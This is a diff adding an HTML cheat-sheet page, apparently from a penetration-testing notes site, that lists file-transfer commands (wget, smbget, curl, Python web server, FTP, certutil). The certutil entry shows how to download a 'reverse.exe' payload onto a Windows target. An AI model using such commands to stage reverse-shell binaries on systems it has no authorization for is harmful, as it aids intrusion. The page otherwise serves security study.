@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"/>
+        <link rel="stylesheet" href="../../styles/styles.css"/>
+        <link rel="script" href="./scripts/cachebuster1.2.js"/>
+        <title>Upload/Download</title>
+    </head>
+    <body>
+        <button class="home-button" onclick="window.location.href='../../index.html'">Home</button>
+        <div class="border-div">
+            <h1>Upload/Download</h1>
+            <pre id="wget"></pre>
+            <div class="section-wrapper">
+                <h2>Wget</h2>
+                <p>Wget is a command line utility for retrieving files from the web</p>
+                <p>Usage:</p>
+                <span class="code">wget http://192.168.0.1/file.txt</span>
+            </div>
+            <pre id="smbget"></pre>
+            <div class="section-wrapper">
+                <h2>Smbget</h2>
+                <p>Smbget is a command line utility for retrieving files from the network</p>
+                <p>Usage:</p>
+                <span class="code">smbget smb://192.168.0.1/$share/file.txt</span>
+            </div>
+            <pre id="git"></pre>
+            <div class="section-wrapper">
+                <h2>Git clone</h2>
+                <p>Git clone is a command line utility for cloning repositories</p>
+                <p>Usage:</p>
+                <span class="code">git clone https://github.com/username/repository</span>
+            </div>
+            <pre id="python"></pre>
+            <div class="section-wrapper">
+                <h2>Python Web Server</h2>
+                <p>Python Web Server is a command line utility for creating a web server on your local machine or target machine. This http server can then be accessed through utilities like wget to get files from one machine to another</p>
+                <p>Usage:</p>
+                <p><span class="code">python -m SimpleHTTPServer PORT</span> - Python2/Python3</p>
+                <p><span class="code">python3 -m http.server PORT</span> - Python3 (Shows GET/POST requests)</p>
+            </div>
+            <pre id="curl"></pre>
+            <div class="section-wrapper">
+                <h2>Curl</h2>
+                <p>Curl is a command line utility for retrieving files from the web</p>
+                <p>Usage:</p>
+                <span class="code">curl http://192.168.0.1/file.txt > download.txt</span>
+            </div>
+            <pre id="ftp"></pre>
+            <div class="section-wrapper">
+                <h2>FTP</h2>
+                <p>Usage:</p>
+                <p>Upload file to FTP server: <span class="code">put file.txt</span></p>
+                <p>Download file from FTP server: <span class="code">get file.txt</span></p>
+            </div>
+            <pre id="certutil"></pre>
+            <div class="section-wrapper">
+                <h2>Certutil</h2>
+                <p>Certutil is a command line utility for creating and managing certificates, but can also be used to transfer files to a Windows machine in our case</p>
+                <p>Usage:</p>
+                <span class="code">certutil -urlcache -f http://192.168.0.1:8000/reverse.exe reverse.exe</span>
+            </div>
+        </div>
+    </body>
+</html>
